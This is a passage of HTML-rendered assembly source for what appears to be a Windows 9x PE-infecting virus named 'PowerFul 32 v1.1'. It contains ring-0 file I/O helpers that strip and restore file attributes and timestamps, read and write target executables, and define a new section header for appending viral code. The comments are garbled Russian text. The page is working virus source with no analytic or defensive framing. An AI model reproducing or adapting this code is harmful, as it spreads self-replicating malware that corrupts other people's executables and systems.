        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cl</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">      </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">next_string</span><span class="sc0">
</span><span class="sc5">coincide_string</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">no_coincide_string</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">set_time</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4303h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">time_date_of_file</span><span class="sc4">-</span><span class="sc5">obr_IFSAPI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">time_date_of_file</span><span class="sc4">-</span><span class="sc5">obr_IFSAPI</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">path_to_file</span><span class="sc4">-</span><span class="sc5">obr_IFSAPI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">VXDCall_IFSMgr_Ring0_FileIO</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">void_attr</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">R0_FILEATTRIBUTES</span><span class="sc0"> </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc5">GET_ATTRIBUTES</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">path_to_file</span><span class="sc4">-</span><span class="sc5">obr_IFSAPI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">VXDCall_IFSMgr_Ring0_FileIO</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">exit_void_attr</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">file_attribute</span><span class="sc4">-</span><span class="sc5">obr_IFSAPI</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">R0_FILEATTRIBUTES</span><span class="sc0"> </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc5">SET_ATTRIBUTES</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">VXDCall_IFSMgr_Ring0_FileIO</span><span class="sc0">
</span><span class="sc5">exit_void_attr</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">set_attr</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">R0_FILEATTRIBUTES</span><span class="sc0"> </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc5">SET_ATTRIBUTES</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">file_attribute</span><span class="sc4">-</span><span class="sc5">obr_IFSAPI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">path_to_file</span><span class="sc4">-</span><span class="sc5">obr_IFSAPI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">VXDCall_IFSMgr_Ring0_FileIO</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">open_file</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">R0_OPENCREATFILE</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">ACCESS_READWRITE</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">ACTION_OPENEXISTING</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">path_to_file</span><span class="sc4">-</span><span class="sc5">obr_IFSAPI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">VXDCall_IFSMgr_Ring0_FileIO</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">file_handle</span><span class="sc4">-</span><span class="sc5">obr_IFSAPI</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;‡ ªpëâì ä ©«®¢ë© åí­¤«</span><span class="sc0">
</span><span class="sc5">close_file</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">R0_CLOSEFILE</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">file_handle</span><span class="sc4">-</span><span class="sc5">obr_IFSAPI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">VXDCall_IFSMgr_Ring0_FileIO</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;‚å®¤: ECX - áª®«ìª® ¯p®ç¨â âì</span><span class="sc0">
</span><span class="sc1">;      EDX - ®âªã¤  ¯p®ç¨â âì</span><span class="sc0">
</span><span class="sc1">;      ESI - ªã¤  ç¨â âì</span><span class="sc0">
</span><span class="sc5">read_file</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">R0_READFILE</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">file_handle</span><span class="sc4">-</span><span class="sc5">obr_IFSAPI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">VXDCall_IFSMgr_Ring0_FileIO</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;‚å®¤: ECX - áª®«ìª® § ¯¨á âì</span><span class="sc0">
</span><span class="sc1">;      EDX - ªã¤  ¯¨á âì</span><span class="sc0">
</span><span class="sc1">;      ESI - ¤ ­­ë¥ ¤«ï § ¯¨á¨</span><span class="sc0">
</span><span class="sc5">write_to_file</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">R0_WRITEFILE</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">file_handle</span><span class="sc4">-</span><span class="sc5">obr_IFSAPI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">VXDCall_IFSMgr_Ring0_FileIO</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">VXDCall_IFSMgr_Ring0_FileIO</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">      </span><span class="sc2">20h</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc5">_IFSMgr_Ring0_FileIO</span><span class="sc4">,</span><span class="sc5">IFSMgr_Device_ID</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">random_any_edx</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">0fffffffeh</span><span class="sc0">
</span><span class="sc5">random_edx</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">init_rnd_proc</span><span class="sc0">
</span><span class="sc5">cell_for_rnd_number</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0100h</span><span class="sc0">
</span><span class="sc5">init_rnd_proc</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">imul</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc2">4dh</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">       </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">quit_from_rnd</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc0">   </span><span class="sc1">;EDX:EAX / EBX  -&gt; EAX:EDX</span><span class="sc0">
</span><span class="sc5">quit_from_rnd</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">New_OBJ</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'.text'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;‚­¨¬ ­¨¥! p¨ ¨§¬¥­¥­¨¨ ­ ¤¯¨á¨, p §¬¥p íâ®©</span><span class="sc0">
                       </span><span class="sc1">;á¥ªæ¨¨ ¤®«¦¥­ p ¢­ïâìáï 8.</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc4">,</span><span class="sc2">00000000h</span><span class="sc0"> </span><span class="sc1">;VIRTUAL SIZE   RVA ®¡ì¥ªâ </span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc4">,</span><span class="sc2">00000000h</span><span class="sc0"> </span><span class="sc1">;PHYS SIZE      PHYS OFFSET</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc4">,</span><span class="sc2">00000000h</span><span class="sc0"> </span><span class="sc1">;RESERVED       RESERVED</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc4">,</span><span class="sc2">60000020h</span><span class="sc0"> </span><span class="sc1">;RESERVED       OBJECT FLAGS</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"PowerFul 32 v1.1 (c) DK and —“/5"</span><span class="sc0">
</span><span class="sc5">end_crypt</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">end_virus</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">busy_flag</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">file_handle</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">file_attribute</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">time_date_of_file</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;0, ¥á«¨ ­¥ ®¤­® ¨¬ï ¨§ ¯¥p¥ç­ï FILENAMES ­¥ á®¢¯ «®.</span><span class="sc0">
</span><span class="sc1">;ˆ­ ç¥ ­®¬¥p áâp®ª¨ á®¢¯ ¢è¥£® ¨¬¥­¨.</span><span class="sc0">
</span><span class="sc5">filename</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;0, ¥á«¨ ­¥ ®¤­® p áè¨p¥­¨¥ ¨§ ¯¥p¥ç­ï extentions ­¥ á®¢¯ «®.</span><span class="sc0">
</span><span class="sc1">;ˆ­ ç¥ ­®¬¥p áâp®ª¨ á®¢¯ ¢è¥£® p áè¨p¥­¨ï.</span><span class="sc0">
</span><span class="sc5">extention</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;‚­¨¬ ­¨¥ ¢ á«ãç ¥, ¥á«¨ extention=0, ¬ áª¨ ­¥ ¯p®¢¥pïîâáï</span><span class="sc0">
</span><span class="sc1">;0, ¥á«¨ ­¥ ®¤­  ¬ áª  ¨§ ¯¥p¥ç­ï filemasks ­¥ á®¢¯ « .</span><span class="sc0">
</span><span class="sc1">;ˆ­ ç¥ ­®¬¥p áâp®ª¨ á®¢¯ ¢è¥© ¬ áª¨.</span><span class="sc0">
</span><span class="sc5">filemask</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;PE § £®«®¢®ª</span><span class="sc0">
</span><span class="sc5">PE_header</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">060h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc1">;®á«¥¤­¨© WIN ®¡ì¥ªâ</span><span class="sc0">
</span><span class="sc5">last_WIN_object</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">040d</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc1">;Šã¤  ¡ã¤¥¬ ¯¨á âì ¨§¬¥­¥­­ë© PE § £®«®¢®ª</span><span class="sc0">
</span><span class="sc5">PE_header_entrypoint</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;Šã¤  ¡ã¤¥¬ ¯¨á âì ­®¢ë© ®¡ì¥ªâ</span><span class="sc0">
</span><span class="sc5">New_OBJ_entrypoint</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">path_to_file</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">common_buffer</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">NUL_buffer</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">exit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">ExitProcess</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">start_virus</span><span class="sc0">

</span></div></body>
</html>
